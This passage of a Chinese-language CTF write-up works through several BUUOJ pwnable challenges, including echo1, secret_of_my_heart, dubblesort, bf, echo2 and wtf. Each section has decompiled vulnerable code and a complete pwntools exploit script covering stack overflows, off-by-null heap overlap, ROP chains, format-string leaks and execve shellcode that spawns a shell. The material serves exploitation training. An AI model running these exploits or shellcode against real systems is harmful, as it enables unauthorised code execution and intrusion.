+<p><strong>strncat</strong> 会自动在末尾追加 <strong>\x00</strong> 造成栈溢出覆盖 <strong>bullet-&gt;size</strong> 的值，之后再此调用这个函数导致栈溢出</p>
+<p>这里的 <strong>bullet</strong> 是在 <code>main</code>函数栈上面的，所以必须当<code>main</code>返回时，才能实现ret跳转</p>
+<pre><code class="language-c">    if ( beat(&amp;s, &amp;werewolf) )
+      return 0;
+</code></pre>
+<p>这里就必须打败werewolf，我们的栈溢出才有效果</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc=ELF(&quot;libc-2.23.so&quot;)
+# libc = elf.libc
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def create(desc):
+	sla(&quot;Your choice :&quot;,'1')
+	sa(&quot;Give me your description of bullet :&quot;,desc)
+
+def power(desc):
+	sla(&quot;Your choice :&quot;,'2')
+	sa(&quot;bullet :&quot;,desc)
+
+def beat():
+	sla(&quot;Your choice :&quot;,'3')
+
+
+def exp(fun,param):
+	create('A'*0x20)
+	power('B'*0x10)
+	power(p32(0x7FFFFFFF)+&quot;A&quot;*3+p32(fun)+p32(elf.sym[&quot;main&quot;])+p32(param))
+	beat()
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+
+	exp(elf.plt['puts'],elf.got['puts'])
+
+	ru('Oh ! You win !!\n')
+	puts = u32(sh.recv(4))
+	lg(&quot;puts&quot;,puts)
+	libc_base = puts - libc.symbols['puts']
+	system = libc_base + libc.symbols['system']
+	bin_sh = libc_base + libc.search('/bin/sh').next()
+	lg(&quot;system&quot;,system)
+	lg(&quot;bin_sh&quot;,bin_sh)
+	exp(system,bin_sh)
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;29908&quot;,0,1)
+</code></pre>
+<h2>pwnable_echo1</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p>这道题函数表比较多，其实就是一个简单的栈溢出+shellcode</p>
+<p>开始把&quot;jmp rsp&quot;写上去，再把shellcode写再bss上面，再利用跳转去执行</p>
+<p><code>echo1</code></p>
+<pre><code class="language-c">__int64 echo1()
+{
+  char s; // [rsp+0h] [rbp-20h]
+
+  (*(o + 3))(o);
+  get_input(&amp;s, 0x80);                          // 栈溢出
+  puts(&amp;s);
+  (*(o + 4))(o, 0x80LL);                        // printf(&quot;goodby %s&quot;,o)
+  return 0LL;
+}
+</code></pre>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc = elf.libc
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+		context.arch='amd64'
+		context.os='linux'
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+
+	id = 0x6020A0
+	sla(&quot;: &quot;,asm(&quot;jmp rsp&quot;))
+	sla(&quot;&gt; &quot;,&quot;1&quot;)
+	paylaod = &quot;a&quot;*0x28
+	paylaod += p64(id)+asm(shellcraft.sh())
+	sh.send(paylaod)
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;25964&quot;,0,1)
+</code></pre>
+<h2>pwnable_secret_of_my_heart</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/19933986-05e1e547fa79d55f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec.png" /></p>
+<ul>
+<li>IDA 反汇编</li>
+</ul>
+<p>从<code>add</code>函数可以看到结构体</p>
+<pre><code>struct chunk{
+  __int64 size;
+  char name[0x20];
+  char *desc;
+}
+</code></pre>
+<p>然后又全局变量 <code>0x202018</code> ,每0x30个写入一个chunk结构体，那就是一个chunk结构体数组，<code>chunk *dword_202018</code>
+漏洞点 <code>vuln</code></p>
+<pre><code class="language-c">char *__fastcall vuln(chunk *chunks, __int64 size)
+{
+  char *result; // rax
+
+  chunks-&gt;size = size;
+  printf(&quot;Name of heart :&quot;);
+  input(chunks-&gt;name, 0x20u);
+  chunks-&gt;desc = malloc(size);
+  if ( !chunks-&gt;desc )
+  {
+    puts(&quot;Allocate Error !&quot;);
+    exit(0);
+  }
+  printf(&quot;secret of my heart :&quot;);
+  result = &amp;chunks-&gt;desc[input(chunks-&gt;desc, size)];
+  *result = 0;                                  // 字节最后加上\x00
+  return result;
+}
+</code></pre>
+<p>最后一个字节<strong>off by null</strong>漏洞</p>
+<ul>
+<li>利用思路</li>
+</ul>
+<p>程序存在<strong>off by null</strong>，可以把下一个chunk-&gt;size的低位覆盖为0</p>
+<ul>
+<li>libc泄露</li>
+</ul>
+<p>造成堆块重叠泄露libc
+大致原理如下图
+<img src="https://upload-images.jianshu.io/upload_images/19933986-27c8ba4c0aa79f10.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="off by null" /></p>
+<pre><code class="language-python">add(0x28...); #0
+add(0x100,&quot;a&quot;*0xf0+p64(0x100)); #1
+add(0x100...); #2
+
+free(1)
+free(0)
+add(0x28,&quot;a&quot;*0x28) #0
+</code></pre>
+<p>这样把chunk1-&gt;size=0x100
+chunk2-&gt;prevsize = 0x100
+<img src="https://upload-images.jianshu.io/upload_images/19933986-b7d35c3c0ae59d1c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="heap-1" />
+再把chunk分步申请回来</p>
+<pre><code>add(0x80,&quot;4&quot;*4,&quot;b&quot;*4) #1
+add(0x10,&quot;4&quot;*4,&quot;b&quot;*4) #3
+</code></pre>
+<p><img src="https://upload-images.jianshu.io/upload_images/19933986-a006549250407efa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="heap-2" />
+按照上面的原理图</p>
+<pre><code>free(1)
+free(2)
+</code></pre>
+<p>这样我们就可以得到 chunk1 到 chunk2的堆块
+<img src="https://upload-images.jianshu.io/upload_images/19933986-1c4d7b0a7d592aa8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="heap-3" />
+这样后面分配后chunk会慢慢合并在一起</p>
+<pre><code>	add(0x80,&quot;1111&quot;,&quot;g&quot;*0x80) #idx1
+	add(0x100,&quot;2222&quot;,&quot;h&quot;*0x68+p64(0x1234))  #idx2
+	add(0x80,&quot;4444&quot;,&quot;i&quot;*0x80) #idx4
+</code></pre>
+<p><img src="https://upload-images.jianshu.io/upload_images/19933986-c924c6c0d373a469.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="heap-4" />
+之前的restchunk也被分配过来了，chunk2和chunk3都是同一个chunk</p>
+<pre><code>free(2)
+show(3)
+</code></pre>
+<p>这样就可以泄露libc</p>
+<ul>
+<li>攻击</li>
+</ul>
+<p>之后用unsotedbin attack把malloc_hook该one_gadget就行</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc = elf.libc
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+'''
+0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''
+
+def cmd(ch):
+    sla(&quot;Your choice :&quot;,ch)
+
+def add(size,name,text):
+    cmd(1)
+    sla(&quot;Size of heart : &quot;,size)
+    sa(&quot;Name of heart :&quot;,name)
+    sa(&quot;secret of my heart :&quot;,text)
+
+def show(idx):
+    cmd(2)
+    sla(&quot;Index :&quot;,idx)
+
+def free(idx):
+    cmd(3)
+    sla(&quot;Index :&quot;,idx)
+
+
+def main(ip,port,debug,mode):
+    global sh
+    if debug==0:
+        context.log_level = &quot;debug&quot;
+    else:
+        pass
+    if mode==0:
+        sh = process(name)
+    else:
+        sh = remote(ip,port)
+    one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+
+    add(0x28,&quot;1&quot;*4,&quot;a&quot;*4)#0
+    add(0x100,&quot;2&quot;*4,&quot;a&quot;*0xf0+p64(0x100))#1
+    add(0x100,&quot;3&quot;*4,&quot;a&quot;*4)#2
+
+    free(1)
+    free(0)
+
+    add(0x28,&quot;1&quot;*4,&quot;a&quot;*0x28)#1
+    add(0x80,&quot;4&quot;*4,&quot;b&quot;*4)#2
+    add(0x10,&quot;4&quot;*4,&quot;b&quot;*4)#3
+
+    gdb.attach(sh)
+    raw_input()
+    
+    free(1)
+    free(2)
+
+    add(0x80,&quot;1111&quot;,&quot;g&quot;*0x80) #idx1
+    add(0x100,&quot;2222&quot;,&quot;h&quot;*0x68+p64(0x1234))  #idx2
+    add(0x80,&quot;4444&quot;,&quot;i&quot;*0x80) #idx4
+
+    free(2)
+    show(3)
+
+    libc_base = u64(ru(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))-0x3c4b78
+    malloc_addr = libc_base + libc.sym['__malloc_hook']
+    one = libc_base + one[2]
+    lg(&quot;malloc_addr&quot; ,malloc_addr)
+    lg(&quot;one gaget &quot;,one )
+    
+    free(1)
+    add(0x100, &quot;a&quot;*4,&quot;e&quot;*0x80+p64(0)+p64(0x71))
+    
+    free(3)
+    free(1)
+    
+    add(0x100,&quot;a&quot;*4, &quot;f&quot;*0x80+p64(0)+p64(0x71)+p64(malloc_addr-0x23))
+    add(0x60,&quot;a&quot;*4, &quot;f&quot;)
+    add(0x60,&quot;a&quot;*4, &quot;\x00&quot;*0x13+p64(one))
+    free(3)
+    sh.interactive()
+
+if __name__ == '__main__':
+    main(&quot;node3.buuoj.cn&quot;,&quot;27295&quot;,0,1)
+</code></pre>
+<h2>pwnable_317</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p>通过字节定位找到main函数</p>
+<p>发现是中规中矩的 <strong>ret2syscall</strong></p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int result; // eax
+  char *v4; // [rsp+8h] [rbp-28h]
+  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
+  unsigned __int64 v6; // [rsp+28h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  result = ++byte_4B9330;
+  if ( byte_4B9330 == 1 )
+  {
+    sub_446EC0(1u, &quot;addr:&quot;, 5uLL);
+    sub_446E20(0, buf, 0x18uLL);
+    v4 = sub_40EE70(buf);
+    sub_446EC0(1u, &quot;data:&quot;, 5uLL);
+    sub_446E20(0, v4, 0x18uLL);
+    result = 0;
+  }
+  if ( __readfsqword(0x28u) != v6 )
+    sub_44A3E0();
+  return result;
+}
+</code></pre>
+<p>可以向任意地址写最多0x18字节的数据</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+from struct import pack
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc = elf.libc
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+	pop_rdi=0x401696
+	pop_rax=0x41e4af
+	pop_rdx_rsi=0x44a309
+	bin_sh_addr=0x4b4140
+	sla(&quot;addr:&quot;,str(0x4b40f0))
+	sa(&quot;data:&quot;,p64(0x402960)+p64(0x401b6d))
+	sla(&quot;addr:&quot;,0x4b4100)
+	sa(&quot;data:&quot;,p64(pop_rdi))
+	sla(&quot;addr:&quot;,0x4b4108)
+	sa(&quot;data:&quot;,p64(bin_sh_addr)+p64(pop_rax)+p64(0x3b))
+	sla(&quot;addr:&quot;,0x4b4120)
+	sa(&quot;data:&quot;,p64(pop_rdx_rsi)+p64(0)+p64(0))
+	sla(&quot;addr:&quot;,0x4b4138)
+	sa(&quot;data:&quot;,p64(0x446e2c)+&quot;/bin/sh\x00&quot;)
+
+	#get_shell
+	sla(&quot;addr:&quot;,str(0x4b40f0))
+	sa(&quot;data:&quot;,p64(0x401c4b))
+	sh.interactive()
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;28599&quot;,0,1)
+</code></pre>
+<p>也可以用 <strong>ROPgadget</strong> 生成 <strong>ropchain</strong>，再分包送到地址，最后在调用 <code>leave ret</code>返回gadget</p>
+<h2>pwnable_dubblesort</h2>
+<ul>
+<li>
+<p>checksec</p>
+<p>Arch:     i386-32-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+FORTIFY:  Enabled</p>
+</li>
+<li>
+<p>IDA</p>
+</li>
+</ul>
+<p><code>main</code></p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  int *num; // edi
+  unsigned int i; // esi
+  unsigned int idx; // esi
+  int result; // eax
+  unsigned int number; // [esp+18h] [ebp-74h] BYREF
+  int v10[8]; // [esp+1Ch] [ebp-70h] BYREF
+  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF
+  unsigned int v11; // [esp+7Ch] [ebp-10h]
+
+  v11 = __readgsdword(0x14u);
+  inital();
+  __printf_chk(1, &quot;What your name :&quot;);
+  read(0, buf, 0x40u);
+  __printf_chk(1, &quot;Hello %s,How many numbers do you what to sort :&quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;number);
+  v3 = number;
+  if ( number )
+  {
+    num = v10;
+    for ( i = 0; i &lt; number; ++i )
+    {
+      __printf_chk(1, &quot;Enter the %d number : &quot;);
+      fflush(stdout);
+      __isoc99_scanf(&quot;%u&quot;, num);
+      v3 = number;
+      ++num;
+    }
+  }
+  Sort(v10, v3);
+  puts(&quot;Result :&quot;);
+  if ( number )
+  {
+    for ( idx = 0; idx &lt; number; ++idx )
+      __printf_chk(1, &quot;%u &quot;);
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v11 )
+    sub_BA0();
+  return result;
+}
+</code></pre>
+<p>对数组输入进行排序，数组一处</p>
+<ul>
+<li>小知识点：</li>
+</ul>
+<blockquote>
+<p>没有什么字符可以既让scanf认为它是合法字符，同时又不会修改栈上的数据呢？在多次尝试和不断查阅资料后，我发现“+”和“-”可以达到此目的！因为这两个符号可以定义正数和负数，所以会被识别为合法字符。比如输入“+4”会被识别为4，而“-4”则会将其转为正数输出（%u的原因）</p>
+</blockquote>
+<ul>
+<li>思路</li>
+</ul>
+<p>输入name泄露libc_base，数组溢出写rop链，使用+和-跳过Canary</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+# libc = elf.libc
+# libc = ELF(&quot;libc_32.so.6&quot;)
+libc = ELF(&quot;libc-2.23.so&quot;)
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+
+	payload = &quot;a&quot;*0x1c
+	sa(&quot;What your name :&quot;,payload)
+	ru(&quot;a&quot;*0x1c)
+	libc_base = u32(sh.recv(4))- 0x1ae244 
+	system = libc.symbols['system'] + libc_base
+	binsh = libc.search('/bin/sh\x00').next() + libc_base
+	lg(&quot;libc_base&quot;,libc_base)
+	lg(&quot;system,&quot;,system)
+	lg(&quot;binsh,&quot;,binsh)
+
+	sla(&quot;How many numbers do you what to sort :&quot;,str(35))
+	for i in xrange(32):
+		if i == 0x18:
+			sla(&quot; :&quot;, &quot;+&quot;)
+			continue
+		if i &gt;= 0x19:
+			sla(&quot; :&quot;, str(0xf0000000))
+			continue
+	   	sla(&quot; :&quot;, str(i))
+
+	sla(&quot; :&quot;, str(system))
+	sla(&quot; :&quot;, str(system+1))
+	sla(&quot; :&quot;, str(binsh))
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;28070&quot;,0,1)
+</code></pre>
+<h2>pwnable_bf</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p>没啥好审的，使用brianfuck编程</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+# libc = elf.libc
+libc = ELF(&quot;libc-2.23.so&quot;)
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+	p=0x0804a0a0
+	putchar=0x804a030
+	jmp=0x8048671
+
+	ru(&quot;type some brainfuck instructions except [ ]\n&quot;)
+	payload=&quot;.&quot;
+	payload+=&quot;&lt;&quot;*(112-4)+&quot;&lt;.&quot;*4+&quot;&lt;&quot;#leak putchar
+	payload+=&quot;&gt;,&quot;*4+&quot;&lt;&quot;*36+&quot;&gt;,&quot;*4  #reset puts,fgets
+	payload+=&quot;&lt;&quot;*4+'&gt;'*28+'&gt;,'*4+'.' #reset  memset
+
+	sl(payload)
+	sh.recv(1)
+	puts_addr=u32(sh.recv(4)[::-1])
+	print &quot;puts_addr=&quot;+hex(puts_addr)
+
+
+	system_addr=libc.symbols[&quot;system&quot;]+puts_addr-libc.symbols[&quot;putchar&quot;]
+	se(p32(jmp))
+	print &quot;system_addr=&quot;+hex(system_addr)
+	print hex(elf.got[&quot;putchar&quot;])
+	gets_addr=libc.symbols[&quot;gets&quot;]+puts_addr-libc.symbols[&quot;putchar&quot;]
+	print &quot;gets_addr=&quot;+hex(gets_addr)
+	se(p32(system_addr))
+	se(p32(gets_addr))
+	ru(&quot;type some brainfuck instructions except [ ]\n&quot;)
+	sl(&quot;/bin/sh\x00&quot;)
+
+	sh.interactive()
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;29632&quot;,0,1)
+</code></pre>
+<h2>pwnable_echo2</h2>
+<p>和 <a href="#pwnable_echo1">pwnable_echo1</a> 没啥区别</p>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p>这次把echo1关了</p>
+<p><code>echo2</code></p>
+<pre><code class="language-c">__int64 echo2()
+{
+  char format; // [rsp+0h] [rbp-20h]
+
+  (*(o + 3))(o);
+  get_input(&amp;format, 32);
+  printf(&amp;format, 32LL);
+  (*(o + 4))(o);
+  return 0LL;
+}
+</code></pre>
+<p><code>echo3</code></p>
+<pre><code class="language-c">__int64 echo3()
+{
+  char *s; // ST08_8
+
+  (*(o + 3))(o);
+  s = malloc(0x20uLL);
+  get_input(s, 0x20);
+  puts(s);
+  free(s);
+  (*(o + 4))(o, 0x20LL);
+  return 0LL;
+}
+</code></pre>
+<p><code>main</code></p>
+<pre><code class="language-c">  o = malloc(0x28uLL);
+  *(o + 3) = greetings;
+  *(o + 4) = byebye;      
+......
+......
+	if ( choice == 4 )
+        break;
+      puts(&quot;invalid menu&quot;);
+    }
+    cleanup();
+    printf(&quot;Are you sure you want to exit? (y/n)&quot;, &amp;choice);
+    choice = getchar();
+  }
+  while ( choice != 'y' );
+  puts(&quot;bye&quot;);
+</code></pre>
+<ul>
+<li>思路</li>
+</ul>
+<p>1.在输入name时输入shellcode</p>
+<p>2.使用字符串格式化漏洞实现任意地址读，读出shellcode的位置</p>
+<p>3.再退出时没确定退出就释放了 <strong>chunk_o</strong> ，在<code>echo3</code>的时候就会分配回去，而<code>main</code>使用这个chunk保存<code>greetings</code>和<code>byebye</code>，我们就可以修改这个函数地址，调用的时候就会直接调用我们的shellcode</p>
+<p><img src="https://s3.ax1x.com/2021/03/12/6NhzB8.png" alt="6NhzB8.png" /></p>
+<p><img src="https://s3.ax1x.com/2021/03/12/6N4k3n.png" alt="greetings的值被修改" /></p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc = elf.libc
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a   :sh.recvuntil(str(a))
+
+def main(ip,port,debug,mode):
+    global sh
+    if debug==0:
+        context.log_level = &quot;debug&quot;
+    else:
+        pass
+    if mode==0:
+        sh = process(name)
+    else:
+        sh = remote(ip,port)
+    shellcode=&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
+    sla(&quot;hey, what's your name? : &quot;,shellcode)
+    sla(&quot;&gt; &quot;,&quot;2&quot;)
+    sla(&quot;hello &quot;+shellcode+&quot;\n&quot;,&quot;%9$p&quot;)
+    ru(&quot;0x&quot;)
+    shellcode_addr = int(sh.recv(12),16)-0x20
+    lg(&quot;shellcode_addr&quot;,shellcode_addr)
+    sla(&quot;&gt; &quot;,&quot;4&quot;)
+    sla(&quot;Are you sure you want to exit? (y/n)&quot;,&quot;n&quot;)
+    # gdb.attach(sh)
+    # raw_input()
+    sla(&quot;&gt; &quot;,&quot;3&quot;)
+    sl(&quot;a&quot;*24+p64(shellcode_addr))
+    sh.interactive()
+
+if __name__ == '__main__':
+    main(&quot;node3.buuoj.cn&quot;,&quot;26037&quot;,0,1)
+</code></pre>
+<h2>pwnable_wtf</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p><code>main</code></p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4; // [rsp+10h] [rbp-30h]
+  int v5; // [rsp+3Ch] [rbp-4h]
+
+  __isoc99_scanf(&quot;%d&quot;, &amp;v5);
+  if ( v5 &gt; 0x20 )
+  {
+    puts(&quot;preventing buffer overflow&quot;);
+    v5 = 0x20;
+  }
+  my_fgets(&amp;v4, v5);
+  return 0;
+}
+</code></pre>
+<p><code>my_fgets</code></p>
+<pre><code class="language-python">__int64 __fastcall my_fgets(__int64 addr, int len)
+{
+  bool v2; // al
+  int v4; // [rsp+4h] [rbp-1Ch]
+  char buf; // [rsp+1Bh] [rbp-5h]
+  unsigned int i; // [rsp+1Ch] [rbp-4h]
+
+  v4 = len;
+  for ( i = 0; ; ++i )
+  {
+    v2 = v4-- != 0;
+    if ( !v2 )
+      break;
+    read(0, &amp;buf, 1uLL);
+    if ( buf == 10 )
+      break;
+    *(addr + i) = buf;
+  }
+  return i;
+}
+</code></pre>
+<p><code>main</code>输入长度和比较是 <strong>int</strong>，而<code>my_gets</code>是 <strong>unsigned int</strong>，导致整数溢出从而栈溢出</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc = elf.libc
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+	sl(&quot;-1&quot;)
+	paylaod = &quot;a&quot;*0x38+p64(0x4005F4)
+	sl(paylaod)
+	print sh.recvall()
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;26335&quot;,0,1)
+</code></pre>
+<h2>pwnable_dragon</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p><code>FightDragon</code></p>
+<pre><code class="language-c">void __cdecl FightDragon(int a1)
+{
+  char v1; // al
+  void *v2; // ST1C_4
+  int v3; // [esp+10h] [ebp-18h]
